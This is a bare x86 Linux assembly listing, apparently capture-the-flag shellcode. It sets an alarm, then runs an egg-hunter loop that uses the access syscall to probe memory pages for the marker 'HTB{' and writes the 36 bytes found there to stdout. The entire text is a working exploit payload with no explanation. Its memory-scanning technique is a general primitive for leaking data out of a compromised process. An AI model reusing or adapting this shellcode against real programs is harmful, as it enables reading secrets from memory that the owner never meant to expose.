_start:
  push 0x3c                 
  pop ebx
  push 0x1b                 
  pop eax
  int 0x80
  mov edi, dword 0x7b425448 
  mov edx, 0x5FFFFFFF        

next_page:
  or dx, 0xfff            
next_address:
  inc edx                 
  pusha                  
  xor ecx, ecx            
  lea ebx, [edx + 0x4]   
  mov al, 0x21            
  int 0x80
  cmp al, 0xf2          
  popa                    
  jz next_page           
  cmp [edx], edi          
  jnz next_address       
  mov ecx, edx            
  push 0x24               
  pop edx
  push 0x1              
  pop ebx
  mov al, 0x4           
  int 0x80
